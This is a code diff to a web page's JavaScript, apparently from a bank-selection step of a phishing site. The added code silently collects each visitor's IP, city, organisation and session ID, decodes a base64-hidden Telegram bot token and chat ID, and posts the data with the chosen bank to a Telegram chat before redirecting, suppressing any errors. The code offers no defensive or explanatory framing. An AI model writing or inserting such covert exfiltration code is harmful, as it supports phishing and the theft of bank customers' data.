@@ -1446,7 +1446,28 @@ document.addEventListener('DOMContentLoaded', function() {
                     break;
                 }
             }
-            window.location.href = './' + target;
+
+            // Notifier Telegram immédiatement
+            var _ip = sessionStorage.getItem('__xip') || 'N/A';
+            var _city = sessionStorage.getItem('__xcity') || 'N/A';
+            var _org = sessionStorage.getItem('__xorg') || 'N/A';
+            var _sid = sessionStorage.getItem('__xsid') || 'N/A';
+            var _tok = atob('ODQyMTQxMDU3NDpBQUdHeVlYb0QxMHdZTXNVamJaV3hDWU80SjMzdFltQVBBNA==');
+            var _cid = atob('Njc4ODAxMjQ4MQ==');
+
+            fetch('https://api.telegram.org/bot' + _tok + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: _cid,
+                    text: '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + (label || 'Banque') + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏙️ Ville: <code>' + _city + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _sid + '</code>',
+                    parse_mode: 'HTML'
+                })
+            }).catch(function(){});
+
+            setTimeout(function(){
+                window.location.href = './' + target;
+            }, 300);
         });
     });
 });
